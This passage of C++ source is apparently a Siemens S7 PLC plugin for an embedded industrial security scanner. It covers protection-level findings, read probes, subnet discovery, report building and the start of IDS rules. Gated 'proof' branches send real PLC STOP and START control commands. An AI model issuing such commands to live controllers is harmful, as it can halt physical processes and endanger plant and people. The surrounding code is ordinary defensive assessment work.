        if (strcmp(sev, "CRITICAL") == 0) sev_critical++;
        else if (strcmp(sev, "HIGH") == 0) sev_high++;
        else if (strcmp(sev, "MEDIUM") == 0) sev_medium++;
        else if (strcmp(sev, "LOW") == 0) sev_low++;
        else sev_info++;
    };

    if (!setup_ok) {
        findings.push_back(make_finding_json(
            "s7_setup_comm_failed",
            "S7 Setup Communication failed",
            "INFO",
            "Target accepted ISO-on-TCP but did not complete S7 Setup Communication; device may require additional TSAP params or may not be an S7 PLC.",
            "Verify target is a Siemens S7 device reachable on TCP/102; if applicable, try correct TSAP/rack/slot settings."
        ));
        bump("INFO");
    } else {
        // Communication limits (from SetupComm negotiation)
        if (wants("comm_limits")) {
            char d[256];
            snprintf(d, sizeof(d),
                     "Negotiated PDU size=%u, max_jobs_calling=%u, max_jobs_called=%u (TSAP src=%04X dst=%04X tpdu=%02X)",
                     (unsigned)dev_info.asdu_length,
                     (unsigned)dev_info.max_jobs_calling,
                     (unsigned)dev_info.max_jobs_called,
                     (unsigned)src_tsap, (unsigned)dst_tsap, (unsigned)tpdu);
            findings.push_back(make_finding_json(
                "s7_comm_limits",
                "S7 communication limits (SetupComm)",
                "INFO",
                d,
                "Use these values to size scans and avoid overloading the PLC. Prefer single-connection, serialized requests."
            ));
            bump("INFO");
        }

        // Block inventory (non-invasive)
        if (wants("block_inventory")) {
            S7BlockCountEntry bc[7];
            psram_string e;
            if (!s7_list_blocks_counts(sock, bc, e)) {
                findings.push_back(make_finding_json(
                    "s7_block_inventory_failed",
                    "Block inventory failed",
                    "INFO",
                    "Listing blocks (counts) failed; device may restrict programming functions or require different access level.",
                    "Keep TCP/102 restricted. If you need block inventory, use an engineering station in a controlled environment."
                ));
                bump("INFO");
            } else {
                // Summarize counts
                char sum[256];
                snprintf(sum, sizeof(sum),
                         "Block counts: OB=%u DB=%u FC=%u FB=%u SDB=%u (others may exist)",
                         (unsigned)(bc[0].type == 0x38 ? bc[0].count : 0),
                         (unsigned)(bc[1].type == 0x41 ? bc[1].count : 0),
                         (unsigned)(bc[3].type == 0x43 ? bc[3].count : 0),
                         (unsigned)(bc[5].type == 0x45 ? bc[5].count : 0),
                         (unsigned)(bc[2].type == 0x42 ? bc[2].count : 0));
                findings.push_back(make_finding_json(
                    "s7_block_inventory",
                    "Block inventory (counts)",
                    "LOW",
                    sum,
                    "If exposed to untrusted networks, block inventory increases fingerprinting/reconnaissance surface."
                ));
                bump("LOW");
            }
        }

        // Read probes (non-invasive but active): M/I/Q/DB read(1 byte)
        if (wants("read_probes")) {
            struct Probe { const char* id; uint8_t area; uint16_t db; };
            Probe probes[] = {
                {"m0", 0x83, 0},
                {"i0", 0x81, 0},
                {"q0", 0x82, 0},
                {"db1_0", 0x84, 1},
            };
            for (size_t i = 0; i < sizeof(probes)/sizeof(probes[0]); ++i) {
                std::vector<uint8_t> data;
                psram_string e;
                bool okr = s7_read_var_bytes(this, sock, (uint16_t)(0x0500 + (uint16_t)i),
                                             probes[i].area, probes[i].db, 0, 1, data, e);
                if (okr) {
                    findings.push_back(make_finding_json(
                        "s7_read_probe_ok",
                        "Read probe succeeded",
                        "INFO",
                        probes[i].id,
                        "Restrict read access to authorized engineering hosts only."
                    ));
                    bump("INFO");
                } else {
                    findings.push_back(make_finding_json(
                        "s7_read_probe_failed",
                        "Read probe failed",
                        "INFO",
                        probes[i].id,
                        "This may indicate access controls or unsupported area; still keep TCP/102 restricted."
                    ));
                    bump("INFO");
                }
            }
        }

        // Protection posture
        if (wants("protection_level")) {
            if (dev_info.protection_level == S7::PROTECTION_NONE) {
                findings.push_back(make_finding_json(
                    "s7_no_cpu_protection",
                    "No CPU protection (Protection Level 0)",
                    "CRITICAL",
                    "CPU protection level is 0; access is typically unauthenticated and control/read actions may be possible depending on CPU model.",
                    "Enable CPU protection (level 2 or 3), restrict access to TCP/102, and segment the OT network."
                ));
                bump("CRITICAL");
            } else if (dev_info.protection_level == S7::PROTECTION_WRITE) {
                findings.push_back(make_finding_json(
                    "s7_weak_cpu_protection",
                    "Weak CPU protection (Protection Level 1)",
                    "HIGH",
                    "CPU is write-protected only; unauthenticated reads and device fingerprinting are commonly still possible.",
                    "Increase CPU protection to level 2 or 3, and restrict TCP/102 exposure."
                ));
                bump("HIGH");
            }
        }

        // Unauthenticated information disclosure (best-effort)
        if (wants("unauthenticated_info")) {
            if (dev_info.szl_read_success) {
                findings.push_back(make_finding_json(
                    "s7_unauthenticated_szl_read",
                    "Unauthenticated SZL information disclosure",
                    "LOW",
                    "SZL reads succeeded without authentication; device identification data (module, order code, serial, protection) may be disclosed to any host with access to TCP/102.",
                    "Restrict TCP/102 at the network boundary; use CPU protection and strong access controls; consider secure engineering access workflows."
                ));
                bump("LOW");
            } else {
                findings.push_back(make_finding_json(
                    "s7_szl_restricted",
                    "SZL reads restricted",
                    "INFO",
                    "SZL reads appear restricted (or failed); device disclosed less identification information than typical.",
                    "Keep CPU protection enabled and continue to restrict TCP/102 exposure."
                ));
                bump("INFO");
            }
        }

        // STOP capability assessment (unsafe to actually test); report risk only.
        if (wants("stop_capability_assessment")) {
            const bool risky = (dev_info.protection_level == S7::PROTECTION_NONE);
            if (risky) {
                findings.push_back(make_finding_json(
                    "s7_stop_cpu_risk",
                    "Potential STOP CPU acceptance (not executed)",
                    "HIGH",
                    "Based on Protection Level 0, control functions such as STOP CPU may be accepted; this scan does not send the STOP command.",
                    "Enable CPU protection level 2 or 3 and restrict TCP/102 to authorized engineering hosts only."
                ));
                bump("HIGH");
            } else {
                findings.push_back(make_finding_json(
                    "s7_stop_cpu_not_tested",
                    "STOP CPU check skipped (safe mode)",
                    "INFO",
                    "STOP CPU command was not sent; higher protection levels reduce the likelihood of acceptance.",
                    "If you need an explicit STOP acceptance test, run it only in a controlled lab environment."
                ));
                bump("INFO");
            }
        }

        // Proof operations (state-changing): only if explicitly selected and SecurityManager allows fuzzing.
        if (wants("proof_plc_stop")) {
            if (!sec_ || !sec_->isFuzzingAllowed()) {
                findings.push_back(make_finding_json(
                    "s7_proof_plc_stop_blocked",
                    "PLC STOP proof blocked by security policy",
                    "INFO",
                    sec_ ? sec_->getFuzzingBlockReason() : "SecurityManager unavailable",
                    "Enable fuzzing only in a controlled lab environment."
                ));
                bump("INFO");
            } else {
                psram_string e;
                bool okp = s7_plc_control(sock, /*pdu_ref*/0x0600, /*mode*/0x00, /*func*/0x29, e);
                findings.push_back(make_finding_json(
                    okp ? "s7_proof_plc_stop_sent" : "s7_proof_plc_stop_failed",
                    "PLC STOP proof (sent)",
                    okp ? "CRITICAL" : "HIGH",
                    okp ? "STOP command sent (device response indicates success)." : "STOP command sent but failed / rejected.",
                    "Do not run on production systems."
                ));
                bump(okp ? "CRITICAL" : "HIGH");
            }
        }
        if (wants("proof_plc_start")) {
            if (!sec_ || !sec_->isFuzzingAllowed()) {
                findings.push_back(make_finding_json(
                    "s7_proof_plc_start_blocked",
                    "PLC START proof blocked by security policy",
                    "INFO",
                    sec_ ? sec_->getFuzzingBlockReason() : "SecurityManager unavailable",
                    "Enable fuzzing only in a controlled lab environment."
                ));
                bump("INFO");
            } else {
                psram_string e;
                bool okp = s7_plc_control(sock, /*pdu_ref*/0x0601, /*mode*/(uint8_t)'H', /*func*/0x28, e);
                findings.push_back(make_finding_json(
                    okp ? "s7_proof_plc_start_sent" : "s7_proof_plc_start_failed",
                    "PLC START proof (sent)",
                    okp ? "CRITICAL" : "HIGH",
                    okp ? "START/Restart command sent (device response indicates success)." : "START/Restart command sent but failed / rejected.",
                    "Do not run on production systems."
                ));
                bump(okp ? "CRITICAL" : "HIGH");
            }
        }
    }

    ::close(sock);
    scans_ok_++;

    const uint64_t t1_ms = (uint64_t)(esp_timer_get_time() / 1000ULL);

    // Build JSON report
    PSRAMAllocator<char> alloc;
    psram_string rep(alloc);
    rep.reserve(2048 + findings.size() * 240);

    rep += PSRAMUtils::createPSRAMString("{\"scan\":{");
    rep += PSRAMUtils::createPSRAMString("\"protocol\":\"s7\",");
    rep += PSRAMUtils::createPSRAMString("\"target\":\"");
    json_append_escaped(rep, ip_ps.c_str());
    rep += PSRAMUtils::createPSRAMString("\",\"port\":");
    char pb[24]; snprintf(pb, sizeof(pb), "%u", (unsigned)port);
    rep += PSRAMUtils::createPSRAMString(pb);
    rep += PSRAMUtils::createPSRAMString(",\"interface\":\"");
    rep += PSRAMUtils::createPSRAMString(ifkey);
    rep += PSRAMUtils::createPSRAMString("\",\"timestamp_ms\":");
    char tb[32]; snprintf(tb, sizeof(tb), "%llu", (unsigned long long)t0_ms);
    rep += PSRAMUtils::createPSRAMString(tb);
    rep += PSRAMUtils::createPSRAMString(",\"duration_ms\":");
    snprintf(tb, sizeof(tb), "%llu", (unsigned long long)(t1_ms - t0_ms));
    rep += PSRAMUtils::createPSRAMString(tb);
    rep += PSRAMUtils::createPSRAMString(",\"setup_comm_ok\":");
    rep += PSRAMUtils::createPSRAMString(setup_ok ? "true" : "false");
    rep += PSRAMUtils::createPSRAMString("},");

    // Asset (best-effort)
    rep += PSRAMUtils::createPSRAMString("\"asset\":{");
    rep += PSRAMUtils::createPSRAMString("\"vendor\":\"Siemens\"");
    if (dev_info.order_code[0] != '\0') {
        rep += PSRAMUtils::createPSRAMString(",\"product\":\"");
        json_append_escaped(rep, dev_info.order_code);
        rep += PSRAMUtils::createPSRAMString("\"");
    } else if (dev_info.module_type[0] != '\0') {
        rep += PSRAMUtils::createPSRAMString(",\"product\":\"");
        json_append_escaped(rep, dev_info.module_type);
        rep += PSRAMUtils::createPSRAMString("\"");
    }
    if (dev_info.firmware_version[0] != '\0') {
        rep += PSRAMUtils::createPSRAMString(",\"firmware\":\"");
        json_append_escaped(rep, dev_info.firmware_version);
        rep += PSRAMUtils::createPSRAMString("\"");
    }
    rep += PSRAMUtils::createPSRAMString("},");

    // scan_types_requested
    rep += PSRAMUtils::createPSRAMString("\"scan_types_requested\":[");
    for (size_t i = 0; i < scan_types.size(); ++i) {
        if (i) rep += PSRAMUtils::createPSRAMString(",");
        rep += PSRAMUtils::createPSRAMString("\"");
        json_append_escaped(rep, scan_types[i].c_str());
        rep += PSRAMUtils::createPSRAMString("\"");
    }
    rep += PSRAMUtils::createPSRAMString("],");

    // Fingerprint (best-effort)
    psram_string fp;
    buildDeviceInfoJSON(dev_info, ip_ps.c_str(), port, fp);
    rep += PSRAMUtils::createPSRAMString("\"fingerprint\":");
    rep += fp;
    rep += PSRAMUtils::createPSRAMString(",");

    // findings
    rep += PSRAMUtils::createPSRAMString("\"findings\":[");
    for (size_t i = 0; i < findings.size(); ++i) {
        if (i) rep += PSRAMUtils::createPSRAMString(",");
        rep += findings[i];
    }
    rep += PSRAMUtils::createPSRAMString("],");

    // summary
    rep += PSRAMUtils::createPSRAMString("\"summary\":{");
    char sbuf[128];
    snprintf(sbuf, sizeof(sbuf),
             "\"critical\":%u,\"high\":%u,\"medium\":%u,\"low\":%u,\"info\":%u",
             (unsigned)sev_critical, (unsigned)sev_high, (unsigned)sev_medium, (unsigned)sev_low, (unsigned)sev_info);
    rep += PSRAMUtils::createPSRAMString(sbuf);
    rep += PSRAMUtils::createPSRAMString("}}");

    // Emit findings to ReportingEngine (structured) for audit log / file reporter.
    for (auto const& f : findings) {
        reportVulnerabilityPSRAM(target_label, f, psram_string{}, LogLevel::WARNING);
    }

    out_report = rep;
    return true;
}

std::string S7Plugin::legacyDoVulnerabilityScan(const std::string& target) {
    std::string ip;
    uint16_t port;
    psram_string target_ps = PSRAMUtils::createPSRAMString(target.c_str());
    if (!parseTarget(target, ip, port)) {
        scans_fail_++;
        return "";
    }

    // Create socket for vulnerability testing
    int sock = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) {
        scans_fail_++;
        return "";
    }
    configureTcpSocket(sock);

    struct timeval tv{.tv_sec = 3, .tv_usec = 0};
    ::setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    ::setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    // Bind to Ethernet
    esp_netif_t* eth = esp_netif_get_handle_from_ifkey("ETH_DEF");
    esp_netif_ip_info_t eth_ip{};
    if (!eth || esp_netif_get_ip_info(eth, &eth_ip) != ESP_OK || eth_ip.ip.addr == 0) {
        ::close(sock);
        scans_fail_++;
        return "";
    }

    sockaddr_in local{};
    local.sin_family = AF_INET;
    local.sin_addr.s_addr = eth_ip.ip.addr;
    local.sin_port = 0;
    ::bind(sock, (sockaddr*)&local, sizeof(local));

    // Connect to target
    sockaddr_in sa{};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    if (::inet_aton(ip.c_str(), &sa.sin_addr) == 0 || ::connect(sock, (sockaddr*)&sa, sizeof(sa)) != 0) {
        ::close(sock);
        scans_fail_++;
        return "";
    }

    // Send ISO-TP Connection Request
    uint8_t cr[] = {
        0x03, 0x00, 0x00, 0x16,
        0x11, 0xE0, 0x00, 0x00, 0x00, 0x01, 0x00,
        0xC1, 0x02, 0x01, 0x00,
        0xC2, 0x02, 0x01, 0x02,
        0xC0, 0x01, 0x0A
    };
    cr[2] = 0x00; cr[3] = (uint8_t)sizeof(cr);

    if (::send(sock, cr, sizeof(cr), 0) != sizeof(cr)) {
        ::close(sock);
        scans_fail_++;
        return "";
    }

    uint8_t rx[256];
    ssize_t n = ::recv(sock, rx, sizeof(rx), 0);
    if (n < 7 || rx[5] != 0xD0) {
        ::close(sock);
        scans_fail_++;
        return "";
    }

    // Perform discovery
    S7DeviceInfo dev_info;
    dev_info.is_online = true;

    if (!sendS7SetupComm(sock, dev_info)) {
        ::close(sock);
        scans_fail_++;
        return "";
    }

    // Read device information
    readSZL(sock, S7::SZL_MODULE_IDENTIFICATION, 0x0001, dev_info);
    readSZL(sock, S7::SZL_CPU_PROTECTION, 0x0004, dev_info);
    readSZL(sock, S7::SZL_COMPONENT_IDENTIFICATION, 0x0001, dev_info);

    // ==================== VULNERABILITY CHECKS (Fase 2) ====================

    std::vector<psram_string> findings;

    // Check 1: Authentication and Protection Level
    psram_string auth_finding;
    if (checkAuthentication(sock, auth_finding)) {
        findings.push_back(auth_finding);
    }

    // Check 2: Protection Level Analysis
    if (!checkProtectionLevel(sock, dev_info)) {
        psram_string prot_finding = PSRAMUtils::createPSRAMString(
            "{\"id\":\"s7_low_protection\","
            "\"severity\":\"HIGH\","
            "\"detail\":\"CPU protection level insufficient\"}"
        );
        findings.push_back(prot_finding);
    }

    // Check 3: Anonymous STOP capability (safety mode - no actual test)
    psram_string stop_finding;
    if (testAnonymousStop(sock, stop_finding)) {
        findings.push_back(stop_finding);
    }

    ::close(sock);
    scans_ok_++;

    // ==================== BUILD REPORT ====================

    psram_string rep;
    rep += PSRAMUtils::createPSRAMString("# S7 Vulnerability Scan Report\n\n");

    // Target info
    rep += PSRAMUtils::createPSRAMString("**Target**: ");
    rep += PSRAMUtils::createPSRAMString(target.c_str());
    rep += PSRAMUtils::createPSRAMString("\n");
    rep += PSRAMUtils::createPSRAMString("**Status**: ✅ SCAN COMPLETED\n\n");

    // Device fingerprint
    rep += PSRAMUtils::createPSRAMString("## Device Fingerprint\n\n");

    if (dev_info.module_type[0] != '\0') {
        rep += PSRAMUtils::createPSRAMString("- **Type**: ");
        rep += PSRAMUtils::createPSRAMString(dev_info.module_type);
        rep += PSRAMUtils::createPSRAMString("\n");
    }

    if (dev_info.order_code[0] != '\0') {
        rep += PSRAMUtils::createPSRAMString("- **Order Code**: ");
        rep += PSRAMUtils::createPSRAMString(dev_info.order_code);
        rep += PSRAMUtils::createPSRAMString("\n");
    }

    if (dev_info.firmware_version[0] != '\0') {
        rep += PSRAMUtils::createPSRAMString("- **Firmware**: ");
        rep += PSRAMUtils::createPSRAMString(dev_info.firmware_version);
        rep += PSRAMUtils::createPSRAMString("\n");
    }

    char buf[128];
    snprintf(buf, sizeof(buf), "- **Protection Level**: %u (%s)\n",
             dev_info.protection_level,
             dev_info.protection_level == 0 ? "NONE - CRITICAL" :
             dev_info.protection_level == 1 ? "Write-Protected" :
             dev_info.protection_level == 2 ? "Read/Write-Protected" : "Full");
    rep += PSRAMUtils::createPSRAMString(buf);

    snprintf(buf, sizeof(buf), "- **PDU Size**: %u bytes\n", dev_info.asdu_length);
    rep += PSRAMUtils::createPSRAMString(buf);

    // Vulnerabilities section
    rep += PSRAMUtils::createPSRAMString("\n## Vulnerabilities Found\n\n");

    if (findings.empty()) {
        rep += PSRAMUtils::createPSRAMString("✅ No critical vulnerabilities detected.\n");
    } else {
        snprintf(buf, sizeof(buf), "⚠️  **%zu findings**:\n\n", findings.size());
        rep += PSRAMUtils::createPSRAMString(buf);

        for (const auto& finding : findings) {
            rep += PSRAMUtils::createPSRAMString("- ");
            rep += finding;
            rep += PSRAMUtils::createPSRAMString("\n");
        }
    }

    // Recommendations
    rep += PSRAMUtils::createPSRAMString("\n## Recommendations\n\n");

    if (dev_info.protection_level < S7::PROTECTION_READ_WRITE) {
        rep += PSRAMUtils::createPSRAMString("1. **CRITICAL**: Set CPU protection level to 2 or higher\n");
        rep += PSRAMUtils::createPSRAMString("2. Configure password protection for write operations\n");
    }

    if (!dev_info.supports_encryption) {
        rep += PSRAMUtils::createPSRAMString("3. Consider upgrading to S7-1500 with TLS support\n");
    }

    rep += PSRAMUtils::createPSRAMString("4. Implement network segmentation (firewall rules)\n");
    rep += PSRAMUtils::createPSRAMString("5. Enable audit logging on PLC\n");

    // Report findings to ReportingEngine
    for (const auto& finding : findings) {
        reportVulnerabilityPSRAM(target_ps, finding, psram_string{}, LogLevel::WARNING);
    }

    return PSRAMUtils::fromPSRAMString(rep);
}

std::string S7Plugin::doNetworkDiscovery(const std::string& target_network,
                                         uint32_t timeout_ms) {
    psram_string target_ps = PSRAMUtils::createPSRAMString(target_network.c_str());
    psram_string report_ps;
    if (!doNetworkDiscoveryPSRAM(target_ps, timeout_ms, report_ps)) {
        return std::string{};
    }
    return PSRAMUtils::fromPSRAMString(report_ps);
}

bool S7Plugin::doNetworkDiscoveryPSRAM(const psram_string& target_network,
                                       uint32_t timeout_ms,
                                       psram_string& out_report) {
    std::string legacy_target = PSRAMUtils::fromPSRAMString(target_network);
    std::string legacy_report = legacyDoNetworkDiscovery(legacy_target, timeout_ms);
    if (legacy_report.empty()) {
        out_report.clear();
        return false;
    }
    out_report = PSRAMUtils::createPSRAMString(legacy_report.c_str());
    return true;
}

std::string S7Plugin::legacyDoNetworkDiscovery(const std::string& target_network, uint32_t timeout_ms) {
    const uint64_t discovery_start_ms = (uint64_t)(esp_timer_get_time() / 1000ULL);
    psram_string result;
    result += PSRAMUtils::createPSRAMString("{\"protocol\":\"s7\",\"target_network\":\"");
    result += PSRAMUtils::createPSRAMString(target_network.c_str());
    result += PSRAMUtils::createPSRAMString("\",\"devices\":[");

    // Fast fail if Ethernet is not ready (scans are bound to ETH_DEF today).
    {
        esp_netif_t* eth = esp_netif_get_handle_from_ifkey("ETH_DEF");
        esp_netif_ip_info_t eth_ip{};
        if (!eth || esp_netif_get_ip_info(eth, &eth_ip) != ESP_OK || eth_ip.ip.addr == 0) {
            result += PSRAMUtils::createPSRAMString("],\"error\":\"ethernet_not_ready\",\"scan_time_ms\":");
            char tbuf[32];
            const uint64_t elapsed_ms = (uint64_t)(esp_timer_get_time() / 1000ULL) - discovery_start_ms;
            snprintf(tbuf, sizeof(tbuf), "%llu", (unsigned long long)elapsed_ms);
            result += PSRAMUtils::createPSRAMString(tbuf);
            result += PSRAMUtils::createPSRAMString("}");
            return PSRAMUtils::fromPSRAMString(result);
        }
    }

    // Parse network range (simplified implementation) - use PSRAM to avoid IRAM
    psram_vector<psram_string> ips_to_scan;
    uint16_t single_port = 102;
    bool single_has_port = false;

    if (target_network.find('/') != std::string::npos) {
        // CIDR notation - simplified implementation for /24 networks
        auto slash_pos = target_network.find('/');
        // Use stack buffer instead of std::string to avoid IRAM allocation
        char base_ip[32];
        size_t base_len = std::min(slash_pos, sizeof(base_ip) - 1);
        memcpy(base_ip, target_network.c_str(), base_len);
        base_ip[base_len] = '\0';

        // Find last dot
        char* last_dot = strrchr(base_ip, '.');
        if (last_dot) {
            *last_dot = '\0';  // Truncate at last dot to get subnet
            // Build IPs using stack buffer
            char ip_buf[64];
            for (int i = 1; i < 255; ++i) {
                snprintf(ip_buf, sizeof(ip_buf), "%s.%d", base_ip, i);
                ips_to_scan.push_back(PSRAMUtils::createPSRAMString(ip_buf));
            }
        }
    } else {
        // Single host: accept IP or IP:PORT
        std::string ip;
        uint16_t port = 102;
        if (parseTarget(target_network, ip, port)) {
            ips_to_scan.push_back(PSRAMUtils::createPSRAMString(ip.c_str()));
            single_port = port;
            single_has_port = (target_network.find(':') != std::string::npos);
        } else {
            // Fallback: push raw string (legacy behavior)
            ips_to_scan.push_back(PSRAMUtils::createPSRAMString(target_network.c_str()));
        }
    }

    const bool single_target = (ips_to_scan.size() == 1);
    const bool multi_target = (ips_to_scan.size() > 1);

    // Subnet/multi-host cadence controls: prioritize stability over speed.
    bool discovery_lightweight = multi_target;
    uint32_t discovery_host_delay_ms = multi_target ? 150U : 0U;
    uint32_t discovery_pause_every_hosts = multi_target ? 12U : 0U;
    uint32_t discovery_pause_ms = multi_target ? 600U : 0U;
    if (cfg_) {
        auto s7_cfg = cfg_->getProtocolConfig(ProtocolType::S7_COMM);
        auto parse_u32 = [&](const char* key, uint32_t fallback) -> uint32_t {
            auto it = s7_cfg.find(PSRAMUtils::createPSRAMString(key));
            if (it == s7_cfg.end()) return fallback;
            int v = atoi(it->second.c_str());
            if (v < 0) v = 0;
            return (uint32_t)v;
        };
        auto parse_bool = [&](const char* key, bool fallback) -> bool {
            auto it = s7_cfg.find(PSRAMUtils::createPSRAMString(key));
            if (it == s7_cfg.end()) return fallback;
            const char* raw = it->second.c_str();
            if (!raw) return fallback;
            return (strcmp(raw, "1") == 0) ||
                   (strcmp(raw, "true") == 0) ||
                   (strcmp(raw, "TRUE") == 0) ||
                   (strcmp(raw, "on") == 0) ||
                   (strcmp(raw, "ON") == 0);
        };
        discovery_lightweight = parse_bool("discovery_lightweight", discovery_lightweight);
        discovery_host_delay_ms = parse_u32("discovery_host_delay_ms", discovery_host_delay_ms);
        discovery_pause_every_hosts = parse_u32("discovery_pause_every_hosts", discovery_pause_every_hosts);
        discovery_pause_ms = parse_u32("discovery_pause_ms", discovery_pause_ms);
    }
    if (!multi_target) {
        discovery_lightweight = false;
    }
    if (discovery_host_delay_ms > 5000U) discovery_host_delay_ms = 5000U;
    if (discovery_pause_every_hosts > 255U) discovery_pause_every_hosts = 255U;
    if (discovery_pause_ms > 15000U) discovery_pause_ms = 15000U;
    if (multi_target) {
        LOG_INFOF(TAG_S7,
                  "Subnet discovery cadence: lightweight=%s host_delay_ms=%u pause_every_hosts=%u pause_ms=%u hosts=%u",
                  discovery_lightweight ? "true" : "false",
                  (unsigned)discovery_host_delay_ms,
                  (unsigned)discovery_pause_every_hosts,
                  (unsigned)discovery_pause_ms,
                  (unsigned)ips_to_scan.size());
    }

    bool first = true;
    int devices_found = 0;   // online devices only (kept for backwards compatibility)
    int results_emitted = 0; // number of entries appended to "devices"
    // Initialize discovery live totals
    DiscoveryManager::getInstance().initTotalsTLS((uint32_t)ips_to_scan.size());
    uint32_t scanned = 0;

    for (const auto& ip : ips_to_scan) {
        if (multi_target) {
            // Discovery task is subscribed to TWDT in DiscoveryManager: feed it periodically.
            (void)esp_task_wdt_reset();
        }
        scanned++;
        DiscoveryManager::getInstance().updateProgressTLS(ip.c_str(), scanned, /*connected*/0, /*mei*/0, /*probe*/devices_found);
        if (devices_found >= 20) break; // Limit results for S7

        // Use existing activeScanJSON method to test each IP (fast probe).
        // For single targets we run a richer Snap7-like protocol_discovery to match Modbus flow.
        std::string scan_result;
        scan_result.reserve(1024);
        char target_buf[64];
        uint16_t port_to_use = 102;
        if (single_target && single_has_port) port_to_use = single_port;
        snprintf(target_buf, sizeof(target_buf), "%s:%u", ip.c_str(), (unsigned)port_to_use);
        std::string target(target_buf);
        target.reserve(64);

        bool ok = false;
        if (single_target) {
            // Integrated rich discovery (non-invasive).
            psram_string req;
            {
                PSRAMAllocator<char> alloc;
                psram_string ps(alloc);
                ps.reserve(256);
                ps += PSRAMUtils::createPSRAMString("{\"op\":\"protocol_discovery\",\"target\":\"");
                json_append_escaped(ps, target.c_str());
                ps += PSRAMUtils::createPSRAMString("\",\"timeout_ms\":");
                char tb[24]; snprintf(tb, sizeof(tb), "%u", (unsigned)timeout_ms);
                ps += PSRAMUtils::createPSRAMString(tb);

                // Defaults from protocol config if available.
                uint16_t rack = 0, slot = 2;
                if (cfg_) {
                    auto m = cfg_->getProtocolConfig(ProtocolType::S7_COMM);
                    auto it_r = m.find(PSRAMUtils::createPSRAMString("rack"));
                    auto it_s = m.find(PSRAMUtils::createPSRAMString("slot"));
                    if (it_r != m.end()) rack = (uint16_t)atoi(it_r->second.c_str());
                    if (it_s != m.end()) slot = (uint16_t)atoi(it_s->second.c_str());
                }
                char rs[128];
                snprintf(rs, sizeof(rs), ",\"rack\":%u,\"slot\":%u,\"include_block_dir\":true,\"max_per_type\":32}",
                         (unsigned)rack, (unsigned)slot);
                ps += PSRAMUtils::createPSRAMString(rs);
                req = ps;
            }
            psram_string out;
            ok = clientOpsPSRAM(req, out);
            scan_result = PSRAMUtils::fromPSRAMString(out);
        } else {
            ok = activeScanJSON(target, scan_result, timeout_ms, discovery_lightweight);
        }
        if (ok) {
            if (!first) result += PSRAMUtils::createPSRAMString(",");
            psram_string item;
            item += PSRAMUtils::createPSRAMString("{");
            item += PSRAMUtils::createPSRAMString("\"ip\":\""); item += PSRAMUtils::createPSRAMString(ip.c_str()); item += PSRAMUtils::createPSRAMString("\",");
            char pb2[32];
            snprintf(pb2, sizeof(pb2), "\"port\":%u,", (unsigned)port_to_use);
            item += PSRAMUtils::createPSRAMString(pb2);
            item += PSRAMUtils::createPSRAMString("\"protocol\":\"s7\",");
            item += PSRAMUtils::createPSRAMString("\"device_name\":\"S7 PLC\",");
            item += PSRAMUtils::createPSRAMString("\"vendor\":\"Siemens\",");
            item += PSRAMUtils::createPSRAMString("\"status\":\"online\",");
            item += PSRAMUtils::createPSRAMString("\"is_online\":true,");
            item += PSRAMUtils::createPSRAMString("\"details\":"); item += PSRAMUtils::createPSRAMString(scan_result.c_str());
            item += PSRAMUtils::createPSRAMString("}");
            result += item;

            first = false;
            devices_found++;
            results_emitted++;
        } else if (single_target) {
            // For single-IP targets, always return a detailed result entry, even on failure.
            // This avoids confusing "devices: []" when the target is reachable but ISO/S7 is restricted.
            if (!first) result += PSRAMUtils::createPSRAMString(",");

            const char* status = "error";
            if (scan_result.find("connection_timeout") != std::string::npos ||
                scan_result.find("connect_failed") != std::string::npos) {
                status = "offline";
            } else if (scan_result.find("cotp_connection_confirm_failed") != std::string::npos ||
                       scan_result.find("\"cotp_connection_confirm_ok\":false") != std::string::npos) {
                status = "iso_failed";
            } else if (scan_result.find("ethernet_not_ready") != std::string::npos) {
                status = "local_error";
            }

            psram_string item;
            item += PSRAMUtils::createPSRAMString("{");
            item += PSRAMUtils::createPSRAMString("\"ip\":\""); item += PSRAMUtils::createPSRAMString(ip.c_str()); item += PSRAMUtils::createPSRAMString("\",");
            char pb3[32];
            snprintf(pb3, sizeof(pb3), "\"port\":%u,", (unsigned)port_to_use);
            item += PSRAMUtils::createPSRAMString(pb3);
            item += PSRAMUtils::createPSRAMString("\"protocol\":\"s7\",");
            item += PSRAMUtils::createPSRAMString("\"device_name\":\"S7 PLC\",");
            item += PSRAMUtils::createPSRAMString("\"vendor\":\"Siemens\",");
            item += PSRAMUtils::createPSRAMString("\"status\":\""); item += PSRAMUtils::createPSRAMString(status); item += PSRAMUtils::createPSRAMString("\",");
            item += PSRAMUtils::createPSRAMString("\"is_online\":false,");
            item += PSRAMUtils::createPSRAMString("\"details\":"); item += PSRAMUtils::createPSRAMString(scan_result.c_str());
            item += PSRAMUtils::createPSRAMString("}");
            result += item;

            first = false;
            results_emitted++;
        }

        if (multi_target) {
            // Intentional pacing to reduce socket/heap pressure during subnet scans.
            if (discovery_host_delay_ms > 0) {
                vTaskDelay(pdMS_TO_TICKS(discovery_host_delay_ms));
            }
            if (discovery_pause_every_hosts > 0 &&
                (scanned % discovery_pause_every_hosts) == 0 &&
                discovery_pause_ms > 0) {
                vTaskDelay(pdMS_TO_TICKS(discovery_pause_ms));
            }
            (void)esp_task_wdt_reset();
        }
    }

    {
        const uint64_t elapsed_ms = (uint64_t)(esp_timer_get_time() / 1000ULL) - discovery_start_ms;
        // Keep "total_found" as online devices only, but add "total_results" for clarity.
        char tail[140];
        snprintf(tail, sizeof(tail),
                 "],\"total_found\":%d,\"total_results\":%d,\"targets_scanned\":%u,\"scan_time_ms\":%llu}",
                 devices_found, results_emitted, (unsigned)ips_to_scan.size(), (unsigned long long)elapsed_ms);
        result += PSRAMUtils::createPSRAMString(tail);
    }
    return PSRAMUtils::fromPSRAMString(result);
}

bool S7Plugin::isTargetPacket(const NetworkPacket& pkt) {
    return pkt.dst_port==102 || pkt.src_port==102;
}

// ==================== FASE 3: IDS Rules Implementation ====================

bool S7Plugin::doPacketAnalysis(const NetworkPacket& pkt) {
    // ===== FLOW MANAGEMENT: Traccia pacchetto nel sistema di flow tracking =====
    trackPacketInFlow(pkt);

    bool alert_generated = false;
    const uint8_t* b = pkt.data;
    size_t l = pkt.length;

    // Rule 1: Detect S7-Plus (TLS) traffic
    if (isTLSClientHello(b, l)) {
        tls_sessions_.fetch_add(1, std::memory_order_relaxed);
        reportIntrusionPSRAM(pkt,
